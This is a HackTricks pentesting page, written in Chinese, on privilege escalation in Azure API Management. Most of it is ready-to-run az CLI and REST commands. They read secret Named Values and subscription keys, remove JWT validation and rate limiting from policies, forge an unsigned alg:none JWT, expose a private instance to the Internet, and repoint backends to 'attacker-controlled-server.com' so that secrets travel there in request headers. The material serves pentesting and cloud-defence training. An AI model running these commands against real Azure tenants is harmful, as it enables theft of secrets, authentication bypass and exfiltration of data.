# Az - API Management Privesc

{{#include ../../../banners/hacktricks-training.md}}

## `Microsoft.ApiManagement/service/namedValues/read` & `Microsoft.ApiManagement/service/namedValues/listValue/action`

该攻击涉及访问存储在 Azure API Management Named Values 中的敏感机密，攻击者可以通过直接检索机密值，或滥用权限通过 managed identities 获取 Key Vault 支持的机密。
```bash
az apim nv show-secret --resource-group <resource-group> --service-name <service-name> --named-value-id <named-value-id>
```
## `Microsoft.ApiManagement/service/subscriptions/read` & `Microsoft.ApiManagement/service/subscriptions/listSecrets/action`
对于每个订阅，攻击者可以通过使用 listSecrets 端点并使用 POST 方法获取订阅密钥：
```bash
az rest --method POST \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/subscriptions/<subscription-sid>/listSecrets?api-version=2024-05-01"
```
响应包含订阅主密钥 (primaryKey) 和辅助密钥 (secondaryKey)。凭借这些密钥，攻击者可以对通过 API Management Gateway 发布的 APIs 进行身份验证并访问：
```bash
curl -H "Ocp-Apim-Subscription-Key: <primary-key-or-secondary-key>" \
https://<service-name>.azure-api.net/<api-path>
```
攻击者可以访问与该订阅相关的所有 API 和产品。如果该订阅可以访问敏感产品或 API，攻击者可能会获取机密信息或执行未授权的操作。

## `Microsoft.ApiManagement/service/policies/write` or `Microsoft.ApiManagement/service/apis/policies/write`

攻击者首先检索当前的 API 策略：
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/?api-version=2024-05-01&format=rawxml"
```
攻击者可以根据其目标以多种方式修改策略。例如，为了禁用身份验证，如果策略包含 JWT token validation，攻击者可以删除或注释该部分：
```xml
<policies>
<inbound>
<base />
<!-- JWT validation removed by the attacker -->
<!-- <validate-jwt header-name="Authorization" failed-validation-httpcode="401" >
...
</validate-jwt> -->
</inbound>
<backend>
<base />
</backend>
<outbound>
<base />
</outbound>
<on-error>
<base />
</on-error>
</policies>
```
为了移除 rate limiting controls 并允许 denial-of-service attacks，攻击者可以移除或注释掉 quota 和 rate-limit policies：
```xml
<policies>
<inbound>
<base />
<!-- Rate limiting removed by the attacker -->
<!-- <rate-limit calls="100" renewal-period="60" />
<quota-by-key calls="1000" renewal-period="3600" counter-key="@(context.Subscription.Id)" /> -->
</inbound>
...
</policies>
```
要修改后端路由并将流量重定向到攻击者控制的服务器：
```xml
<policies>
...
<inbound>
<base />
<set-backend-service base-url="https://attacker-controlled-server.com" />
</inbound>
...
</policies>
```
随后攻击者应用修改后的策略。请求主体必须是一个包含以 XML 格式表示策略的 JSON 对象：
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/policy?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"format": "rawxml",
"value": "<policies><inbound><base /></inbound><backend><base /></backend><outbound><base /></outbound><on-error><base /></on-error></policies>"
}
}'
```
## JWT 验证 错误配置

攻击者需要知道某个 API 使用 JWT token 验证且该策略配置错误。配置不当的 JWT 验证策略可能包含 `require-signed-tokens="false"` 或 `require-expiration-time="false"`，这会允许服务接受未签名的 tokens 或 永不过期的 tokens。

攻击者使用 none 算法 (unsigned) 创建一个恶意 JWT token：
```
# Header: {"alg":"none"}
# Payload: {"sub":"user"}
eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0.
```
攻击者使用恶意令牌向 API 发送请求：
```bash
curl -X GET \
-H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0." \
https://<apim>.azure-api.net/path
```
如果策略被错误配置为 `require-signed-tokens="false"`，服务将接受未签名的令牌。 如果 `require-expiration-time="false"`，攻击者也可以创建没有过期声明的令牌。

## `Microsoft.ApiManagement/service/applynetworkconfigurationupdates/action`
攻击者首先检查服务的当前网络配置：
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01"
```
攻击者会查看 JSON 响应以验证 `publicNetworkAccess` 和 `virtualNetworkType` 的值。如果 `publicNetworkAccess` 设置为 false 或 `virtualNetworkType` 设置为 Internal，则该服务配置为私有访问。

要将服务暴露到 Internet，攻击者必须更改这两个设置。如果服务以内部模式运行（`virtualNetworkType: "Internal"`），攻击者会将其改为 None 或 External 并启用公共网络访问。可以使用 Azure Management API 完成此操作：
```bash
az rest --method PATCH \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"publicNetworkAccess": "Enabled",
"virtualNetworkType": "None"
}
}'
```
一旦 `virtualNetworkType` 被设置为 `None` 或 `External` 并且 `publicNetworkAccess` 被启用，服务及其所有 APIs 就会从 Internet 可访问，即使它们之前受私有网络或私有终端节点保护。

## `Microsoft.ApiManagement/service/backends/write`
攻击者首先枚举现有的 backends 以确定要修改的哪一个：
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends?api-version=2024-05-01"
```
攻击者获取要修改的后端的当前配置：
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01"
```
攻击者将后端 URL 修改为指向他们控制的服务器。首先，他们从之前的响应中获取 ETag，然后更新后端：
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"description": "Backend modified by attacker"
}
}'
```
或者，攻击者可以配置 backend headers 来 exfiltrate 包含机密的 Named Values。 这是通过 backend credentials configuration 完成的：
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"credentials": {
"header": {
"X-Secret-Value": ["{{named-value-secret}}"]
}
}
}
}'
```
通过此配置，Named Values 会作为 headers 在所有发往攻击者控制的后端的请求中发送，从而使敏感机密得以外泄。

{{#include ../../../banners/hacktricks-training.md}}
